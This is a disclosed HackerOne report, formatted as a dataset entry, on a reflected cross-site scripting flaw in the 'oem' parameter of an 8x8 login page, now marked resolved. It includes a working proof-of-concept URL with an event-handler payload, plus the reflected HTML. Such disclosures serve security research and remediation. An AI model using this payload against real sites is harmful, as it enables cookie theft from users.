---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1392733'
original_report_id: '1392733'
title: xss(r) vcc-na11.8x8.com
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: 8x8
created_at: '2021-11-06T05:47:36.943Z'
disclosed_at: '2023-07-10T16:48:19.363Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 5
asset_identifier: vcc-*.8x8.com
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# xss(r) vcc-na11.8x8.com

## Metadata

- HackerOne Report ID: 1392733
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: 8x8
- Disclosed At: 2023-07-10T16:48:19.363Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

xss(r)  on vcc-na11.8x8.com oem parameter
"oem" parameter in endpoint vcc-na11.8x8.com is not sanitized and is pen to Reflected Cross Site Scripting Attacks
https://vcc-na11.8x8.com/CM/login.php?oem=%22onpointermove%3Dprompt%281%29+class%3Dss11+

**Description:** [add more details about this vulnerability]
xss(r)  on vcc-na11.8x8.com oem parameter
"oem" parameter in endpoint vcc-na11.8x8.com is not sanitized and is pen to Reflected Cross Site Scripting Attacks
Specifically stealing non secure cookies

## Steps To Reproduce:

(Add details for how we can reproduce the issue)

  1. Click on link
https://vcc-na11.8x8.com/CM/login.php?oem=%22onpointermove%3Dprompt%281%29+class%3Dss11+
  2. Move mouse over body
  3. xss is trigerred

## Supporting Material/References:

The payload is reflected multiple places in response body
<a href=" http://www.google.com/chrome">	
	<img src="/./OEM/"onpointermove=prompt(1)class=ss11/common/images/browsers/chrome.png"class="browser-logo" alt="{{#txt_unsupported_browser_chrome#}}" />
	<h2>{{#txt_unsupported_browser_chrome#}}</h2>

From <https://vcc-na11.8x8.com/CM/login.php?oem=%22onpointermove%3Dprompt%281%29+class%3Dss11+>

## Impact

Cookie stealing

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
